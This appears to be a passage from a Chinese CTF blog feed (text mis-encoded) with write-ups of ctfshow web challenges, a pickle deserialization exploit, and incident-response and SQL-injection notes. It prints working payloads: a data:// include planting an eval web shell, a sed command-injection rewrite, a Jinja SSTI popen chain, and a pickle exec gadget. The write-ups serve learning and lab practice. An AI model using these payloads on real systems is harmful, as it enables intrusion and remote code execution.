class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä»£ç <br><a href="https://xz.aliyun.com/t/7436#toc-0">pickleååºåˆ—åŒ–æ¼æ´å­¦ä¹ </a><br><a href="https://xz.aliyun.com/t/7012">é€šè¿‡ASTæ¥æ„é€ Pickle opcode</a><br> pickletools<br> ä½¿ç”¨pickletoolså¯ä»¥æ–¹ä¾¿çš„å°†opcodeè½¬åŒ–ä¸ºä¾¿äºè‚‰çœ¼è¯»å–çš„å½¢å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&quot;\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;q\x01\x85q\x02Rq\x03.&quot;</span></span><br><span class="line">pickletools.dis(data)</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;builtins exec&#x27;</span></span><br><span class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: X    BINUNICODE <span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span></span><br><span class="line">   <span class="number">43</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">45</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">48</span>: R    REDUCE</span><br><span class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">51</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>æˆªå–æºç å…³é”®è·¯ç”±ä»£ç ï¼Œåœ¨è¯¥è·¯ç”±ä¸‹é¦–å…ˆé€šè¿‡cookieæ¥æ”¶åºåˆ—ä»£ç <br>åˆ©ç”¨oæ¥ç»•è¿‡Ré™åˆ¶<br>é¦–å…ˆè¿›è¡Œå˜é‡è¦†ç›–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aa=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;import admin;admin.sec&quot;+&quot;ret=&#x27;</span>shanghe<span class="string">&#x27;;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">OBJ(GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>),aa)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨pkerè¿›è¡Œopcodeæ„é€ <br>ä¹‹åbase64åæ”¾å…¥cookieä¸­ï¼Œç™»å½•å³å¯<br>ï¼ˆæŠ¥500æ˜¯æ­£å¸¸çš„ï¼‰<br>ä¹‹åç™»å½• å¼„å‡º504å³å¯<br><a href="https://mp.weixin.qq.com/s/uh7ZvBIQv9fWXzS5Uc-fXQ">wp</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowå•èº«æ¯ web</title>
      <link href="/2022/07/22/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF%20web/"/>
      <url>/2022/07/22/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF%20web/</url>
      
        <content type="html"><![CDATA[<h2 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strrev(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨é‡Šï¼šstrrevï¼ˆï¼‰å‡½æ•°å¯ä»¥åè½¬å­—ç¬¦ä¸²<br>æ–‡ä»¶åŒ…å«   åˆ©ç”¨dataä¼ªåè®®<br>dataä¼ªåè®®å°±æ˜¯æŠŠä¸€äº›ä½“é‡æ¯”è¾ƒå°çš„æ•°æ®ç›´æ¥åµŒå…¥åœ¨é¡µé¢é‡Œï¼Œè€Œä¸ä½¿ç”¨å¤–éƒ¨é“¾æ¥ã€‚ data:text/plain æ˜¯åµŒå…¥æ–‡æœ¬<br>è¿˜æœ‰ä¸€ç‚¹ï¼šæœ¬é¢˜ä¹Ÿæ˜¯åˆ©ç”¨?&gt;è¿›è¡Œæˆªæ–­<br>äºæ˜¯åˆ©ç”¨payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> eval($_POST[1]);<span class="meta">?&gt;</span>&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&quot;cat /f*&quot;);</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=escapeshellcmd(substr(<span class="variable">$cmd</span>,<span class="number">0</span>,<span class="number">3</span>)).<span class="string">&quot; &quot;</span>.escapeshellarg(<span class="variable">$param</span>).<span class="string">&quot; &quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‡½æ•°ä»‹ç»ï¼š<br>escapeshellcmd</p><blockquote><p>(PHP 4, PHP 5, PHP 7, PHP 8)<br>escapeshellcmd â€” shell å…ƒå­—ç¬¦è½¬ä¹‰<br>è¯´æ˜ escapeshellcmd(string $command): string escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª—<br>shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦<br>ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚<br>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A å’Œ \xFFã€‚ â€™ å’Œ â€œ<br>ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p></blockquote><p>escapeshellarg<br>ä¿è¯ä¼ å…¥å­—ç¬¦ä¸²</p><blockquote><p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7, PHP 8)<br>escapeshellarg â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°<br>è¯´æ˜ escapeshellarg(string $arg): string escapeshellarg()<br>å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell<br>å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦ ã€‚</p></blockquote><p>åˆ©ç”¨sedè¿›è¡Œè§£é¢˜</p><p><a href="https://www.twle.cn/c/yufei/sed/sed-basic-regular-expressions.html">sedä»‹ç»</a><br>sedå·¥ä½œæµç¨‹</p><blockquote><p>è¯»å–è¡Œ -&gt; æ‰§è¡Œ -&gt; æ˜¾ç¤º -&gt; è¯»å–è¡Œ -&gt; æ‰§è¡Œ -&gt; æ˜¾ç¤º -&gt; â€¦ -&gt; è¯»å–è¡Œ -&gt; æ‰§è¡Œ -&gt; æ˜¾ç¤º</p></blockquote><blockquote><p>sed ä»è¾“å…¥æµ ï¼ˆæ–‡ä»¶ã€ç®¡é“ã€æ ‡å‡†è¾“å…¥æµï¼‰ä¸­è¯»å– ä¸€è¡Œ å¹¶å­˜å‚¨åœ¨åå« pattern buffer çš„å†…éƒ¨ç¼“å†²åŒºä¸­ã€‚<br>sed è¿˜åœ¨å†…å­˜ä¸Šå¼€è¾Ÿäº†å¦ä¸€ä¸ªç§æœ‰çš„ç¼“å†²åŒº hold buffer ç”¨äºä¿å­˜å¤„ç†åçš„æ•°æ®ä»¥ä¾›ä»¥åæ£€ç´¢ã€‚<br>æ¯ä¸€ä¸ªå‘¨æœŸæ‰§è¡Œç»“æŸï¼Œsed ä¼šæ¸…ç©º pattern buffer ç¼“å†²åŒºçš„å†…å®¹ï¼Œä½† hold buffer ç¼“å†²åŒºçš„å†…å®¹å¹¶ä¸ä¼šæ¸…ç©ºã€‚<br>hold buffer ç¼“å†²åŒºç”¨äºå­˜å‚¨å¤„ç†åæ•°æ®ï¼Œsed å‘½ä»¤å¹¶ä¸ä¼šå¯¹è¿™é‡Œçš„æ•°æ®å¤„ç†ã€‚</p></blockquote><p>æœ¬ç€éœ€è¦ä»€ä¹ˆå­¦ä»€ä¹ˆçš„åˆå¿ƒ<br>æˆ‘ä»¬ç›´æ¥çœ‹payloadæ¥å­¦ä¹ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=sed&amp;param=/esca/d;s/shell_exec/system/g;w <span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p>sedæ”¯æŒæ­£åˆ™åŒ¹é… /esca/åŒ¹é…åˆ° escapeè¡Œ d å°†å…¶åˆ é™¤<br>sedè¯­å¥ç”¨ï¼›é—´éš”å¼€<br>så­—ç¬¦ä¸²æ›¿æ¢ shell_exec -&gt; system<br>gä¸ºå…¨å±€æ›¿æ¢æ ‡å¿—</p><blockquote><p>g æ ‡å¿—é€šå¸¸ç§°ä¸º å…¨å±€æ›¿æ¢æ ‡å¿—ã€‚<br>ä½¿ç”¨äº†å…¨å±€æ›¿æ¢æ ‡å¿—çš„æ›¿æ¢åˆç§°ä¸º è´ªå©ªæ¨¡å¼ã€‚<br>å…¨å±€æ›¿æ¢æ ‡å¿— g çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹<br>[address1[,address2]]s/search/replacement/g</p></blockquote><p>w å†™å…¥ â€“&gt;å¯ä»¥çœ‹ä½œcpçš„åŠŸèƒ½ç‰ˆ</p><h2 id="å§»ç¼˜æµ‹è¯•"><a href="#å§»ç¼˜æµ‹è¯•" class="headerlink" title="å§»ç¼˜æµ‹è¯•"></a>å§»ç¼˜æµ‹è¯•</h2><p>/souceå‘ç°hint<br><img src="https://img-blog.csdnimg.cn/34d4d7a15509431a823b7cb4a8b07873.png"><br>è¿™é‡Œç”¨äº†and,å‘ç°å¤§æ‹¬å·ä¸èƒ½åŒæ—¶å‡ºç°<br>åˆ©ç”¨â€˜â€™è¿›è¡Œåˆ†å‰²<br>åˆ©ç”¨payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/result?boy_name=&#123;&#123;<span class="string">&#x27;&amp;girl_name=&#x27;</span>.<span class="keyword">__class__</span>.__base__.__subclasses__()[<span class="number">82</span>].__init__.__globals__.__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4fd1f2cbc5144db4b2426f9eba715985.png"></p><blockquote><p>__class__ç”¨äºè¿”å›å¯¹è±¡æ‰€å±çš„ç±»<br>__base__ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç»§æ‰¿çš„ç±»<br>__mro__è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºï¼ŒæŒ‰ç…§å­ç±»åˆ°çˆ¶ç±»åˆ°çˆ¶çˆ¶ç±»çš„é¡ºåºè¿”å›æ‰€æœ‰ç±»<br><strong>subclasses</strong>()è·å–ç±»çš„æ‰€æœ‰å­ç±»<br>__int__æ‰€æœ‰è‡ªå¸¦å¸¦ç±»éƒ½åŒ…å«initæ–¹æ³•ï¼Œå¹¶ä¸”å¸¸ç”¨å®ƒå½“è·³æ¿è°ƒç”¨globals<br>__globals__ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨æ¨¡å—ï¼Œæ–¹æ³•å’Œå…¨å±€å˜é‡ï¼Œç”¨äºé…åˆinitä½¿ç”¨</p></blockquote><p><a href="https://blog.csdn.net/devil8123665/article/details/114598529">SSTIè®²è§£</a></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>ä¸‹è½½å‹ç¼©åŒ…  è¿›è¡Œæš´åŠ›ç ´è§£<br><img src="https://img-blog.csdnimg.cn/384610aff89042a0aabdfc8d98c12272.png"><br>å¾—åˆ°å¯†ç 61f@X<br>è§£å‹å¾—åˆ°å›¾ç‰‡<br>åˆ©ç”¨winhexæŸ¥çœ‹å‘ç°æœ‰ä¸€ä¸²base64ç¼–ç <br><img src="https://img-blog.csdnimg.cn/a2bd2150d1f545bdb487fb1fc829bb40.png"><br>å¾—åˆ°ä¸å®Œå…¨çš„å›¾ç‰‡  å¯¹å…¶è¿›è¡Œè¡¥å…¨æ‰«æ<br>æ‰«æå¾—åˆ°ä¸€åŠflag<br>å¦ä¸€åŠåœ¨åˆ©ç”¨sbæ‰“å¼€å¾—åˆ°<br>æœ€åè®°å¾—çœ‹æç¤ºä¸­å°†ç©ºæ ¼æ›¿æ¢ä¸º_</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æŠ¤ç½‘ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/06/19/%E6%8A%A4%E7%BD%91%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/06/19/%E6%8A%A4%E7%BD%91%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h2><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><h5 id="1ã€æŸ¥çœ‹ç³»ç»Ÿè´¦æˆ·æ˜¯å¦å®‰å…¨"><a href="#1ã€æŸ¥çœ‹ç³»ç»Ÿè´¦æˆ·æ˜¯å¦å®‰å…¨" class="headerlink" title="1ã€æŸ¥çœ‹ç³»ç»Ÿè´¦æˆ·æ˜¯å¦å®‰å…¨"></a>1ã€æŸ¥çœ‹ç³»ç»Ÿè´¦æˆ·æ˜¯å¦å®‰å…¨</h5><p>æ¯”å¦‚çœ‹çœ‹æœåŠ¡å™¨æ˜¯å¦æœ‰å¼±å£ä»¤ï¼Œçœ‹çœ‹è¿œç¨‹ç«¯å£æ˜¯å¦å¯¹å…¬ç½‘å¼€æ”¾ï¼Œï¼Œä¹‹åçœ‹çœ‹æœåŠ¡å™¨æ˜¯ä¸æ˜¯æœ‰å¯ç–‘è´¦æˆ·ï¼Œã€æ–°å¢è´¦æˆ·</p><h5 id="2ã€çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹"><a href="#2ã€çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹" class="headerlink" title="2ã€çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹"></a>2ã€çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹</h5><p>æŸ¥çœ‹ç«¯å£è¿æ¥æƒ…å†µï¼Œæ˜¯å¦æœ‰è¿œç¨‹è¿æ¥ã€å¯ç–‘è¿æ¥</p><p>æ’æŸ¥å¯ç–‘è¿›ç¨‹ï¼ˆå¯ä»¥åˆ©ç”¨Dç›¾å·¥å…·è¿›è¡Œæ’æŸ¥ï¼Œæˆ–è€…æ‰‹åŠ¨æ‰“å¼€è¿›ç¨‹ç®¡ç†å™¨è¿›è¡Œæ’æŸ¥ï¼‰</p><h5 id="3ã€æ£€æŸ¥å¯åŠ¨é¡¹ã€ä»»åŠ¡è®¡åˆ’ã€æœåŠ¡"><a href="#3ã€æ£€æŸ¥å¯åŠ¨é¡¹ã€ä»»åŠ¡è®¡åˆ’ã€æœåŠ¡" class="headerlink" title="3ã€æ£€æŸ¥å¯åŠ¨é¡¹ã€ä»»åŠ¡è®¡åˆ’ã€æœåŠ¡"></a>3ã€æ£€æŸ¥å¯åŠ¨é¡¹ã€ä»»åŠ¡è®¡åˆ’ã€æœåŠ¡</h5><p>çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸å¯åŠ¨é¡¹ï¼Œçœ‹çœ‹è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡è‡ªå¯åŠ¨ï¼Œæœ‰æ²¡æœ‰å¼‚å¸¸çš„æœåŠ¡è‡ªåŠ¨å¯åŠ¨</p><h5 id="4ã€ä¹‹åçœ‹çœ‹æ˜¯å¦å…·æœ‰å¯ç–‘æ–‡ä»¶ã€ç›®å½•"><a href="#4ã€ä¹‹åçœ‹çœ‹æ˜¯å¦å…·æœ‰å¯ç–‘æ–‡ä»¶ã€ç›®å½•" class="headerlink" title="4ã€ä¹‹åçœ‹çœ‹æ˜¯å¦å…·æœ‰å¯ç–‘æ–‡ä»¶ã€ç›®å½•"></a>4ã€ä¹‹åçœ‹çœ‹æ˜¯å¦å…·æœ‰å¯ç–‘æ–‡ä»¶ã€ç›®å½•</h5><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><h5 id="1ã€æŸ¥çœ‹è´¦å·æ˜¯å¦å®‰å…¨"><a href="#1ã€æŸ¥çœ‹è´¦å·æ˜¯å¦å®‰å…¨" class="headerlink" title="1ã€æŸ¥çœ‹è´¦å·æ˜¯å¦å®‰å…¨"></a>1ã€æŸ¥çœ‹è´¦å·æ˜¯å¦å®‰å…¨</h5><p>/etc/passwd  çœ‹ç”¨æˆ·ä¿¡æ¯</p><p>/etc/shadowçœ‹å¯†ç </p><h5 id="2ã€é€šè¿‡-bash-historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤"><a href="#2ã€é€šè¿‡-bash-historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="2ã€é€šè¿‡.bash_historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤"></a>2ã€é€šè¿‡.bash_historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤</h5><h5 id="3ã€çœ‹ç«¯å£ã€è¿›ç¨‹ã€å¼€æœºå¯åŠ¨é¡¹ã€å®šæ—¶ä»»åŠ¡ï¼ˆcrontab-iï¼‰"><a href="#3ã€çœ‹ç«¯å£ã€è¿›ç¨‹ã€å¼€æœºå¯åŠ¨é¡¹ã€å®šæ—¶ä»»åŠ¡ï¼ˆcrontab-iï¼‰" class="headerlink" title="3ã€çœ‹ç«¯å£ã€è¿›ç¨‹ã€å¼€æœºå¯åŠ¨é¡¹ã€å®šæ—¶ä»»åŠ¡ï¼ˆcrontab -iï¼‰"></a>3ã€çœ‹ç«¯å£ã€è¿›ç¨‹ã€å¼€æœºå¯åŠ¨é¡¹ã€å®šæ—¶ä»»åŠ¡ï¼ˆcrontab -iï¼‰</h5><h5 id="4ã€æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶"><a href="#4ã€æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶" class="headerlink" title="4ã€æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶"></a>4ã€æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶</h5><p>åé—¨å¸¸æ”¾ä½ç½®ï¼ˆ**/tmp** ã€**/etc/rc.**local  æœ‰æ—¶å¯ä»¥è¯»å‡ºæ¥<a href="https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020">apache</a>çš„è·¯å¾„ï¼‰</p><p><strong>crontab  log</strong></p><h2 id="sqlmapåŸç†"><a href="#sqlmapåŸç†" class="headerlink" title="sqlmapåŸç†"></a>sqlmapåŸç†</h2><p>â€‹    å®ƒçš„å·¥ä½œåŸç†å’Œæ‰‹å·¥æ³¨å…¥çš„åŸç†æ˜¯ä¸€æ ·çš„ï¼šæ£€æµ‹åŠ¨æ€é¡µé¢ä¸­get/postå‚æ•°ã€cookieã€ httpå¤´ï¼Œå¹¶çˆ†å‡ºæ•°æ®ï¼Œä¸éœ€è¦æˆ‘ä»¬å†æ‰‹åŠ¨å†™payloadï¼Œå› ä¸ºå®ƒæœ‰éå¸¸å¼ºå¤§çš„å¼•æ“ï¼Œå„ç§å„æ ·çš„å‚æ•°ã€å„ç§å„æ ·çš„ä½ç½®ï¼Œå®ƒéƒ½å¯ä»¥å»å®ŒæˆSQLæ³¨å…¥æ¼æ´çš„æ£€æµ‹ã€åˆ©ç”¨ã€ä»¥åŠæ•°æ®çš„æå–</p><h4 id="sqlmap-os-shellåŸç†"><a href="#sqlmap-os-shellåŸç†" class="headerlink" title="sqlmap -os -shellåŸç†"></a>sqlmap -os -shellåŸç†</h4><p>â€‹        åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨into outfileå‡½æ•°å°†ä¸€ä¸ªå¯ä»¥ç”¨æ¥ä¸Šä¼ çš„phpæ–‡ä»¶å†™åˆ°ç½‘ç«™çš„ç›®å½•ä¸‹ï¼Œç„¶ååˆ©ç”¨tmpukjhb.phpä¸Šä¼ äº†ä¸€ä¸ªtmpbezal.phpçš„æ–‡ä»¶ï¼Œtmpbezal.phpè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ä¸”å°†ç»“æœè¿”å›å‡ºæ¥</p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>â€‹    Sql æ³¨å…¥æ”»å‡»æ˜¯é€šè¿‡å°†æ¶æ„çš„ Sql æŸ¥è¯¢æˆ–æ·»åŠ è¯­å¥æ’å…¥åˆ°åº”ç”¨çš„è¾“å…¥å‚æ•°ä¸­ï¼Œå†åœ¨åå° Sql æœåŠ¡å™¨ä¸Šè§£ææ‰§è¡Œè¿›è¡Œçš„æ”»å‡»</p><ul><li>çŒœè§£åå°æ•°æ®åº“ï¼Œè¿™æ˜¯åˆ©ç”¨æœ€å¤šçš„æ–¹å¼ï¼Œç›—å–ç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯ã€‚</li><li>ç»•è¿‡è®¤è¯ï¼Œåˆ—å¦‚ç»•è¿‡éªŒè¯ç™»å½•ç½‘ç«™åå°ã€‚</li><li>æ³¨å…¥å¯ä»¥å€ŸåŠ©æ•°æ®åº“çš„å­˜å‚¨è¿‡ç¨‹è¿›è¡Œææƒç­‰æ“ä½œ</li></ul><p>é˜²å¾¡</p><p>1ã€æ£€æŸ¥å˜é‡æ•°æ®ç±»å‹å’Œæ ¼å¼</p><p>2ã€è¿‡æ»¤ç‰¹æ®Šç¬¦å·</p><p>3ã€ç»‘å®šå˜é‡ï¼Œä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ã€€</p><h5 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h5><p>å°±æ˜¯å°†ä¸€å †sqlè¯­å¥å åŠ åœ¨ä¸€èµ·æ‰§è¡Œï¼Œä½¿ç”¨åˆ†å·ç»“æŸä¸Šä¸€ä¸ªè¯­å¥å†å åŠ å…¶ä»–è¯­å¥ä¸€èµ·æ‰§è¡Œ</p><h5 id="æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°"><a href="#æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°" class="headerlink" title="æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°"></a>æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°</h5><p>updatexml():æ˜¯mysqlå¯¹xmlæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„xpathå‡½æ•°<br>extractvalue()ï¼šæ˜¯mysqlå¯¹xmlæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢çš„xpathå‡½æ•°<br>floor():mysqlä¸­ç”¨æ¥å–æ•´çš„å‡½æ•°<br>exp():æ­¤å‡½æ•°è¿”å›e(è‡ªç„¶å¯¹æ•°çš„åº•)æŒ‡æ•°Xçš„å¹‚å€¼</p><h5 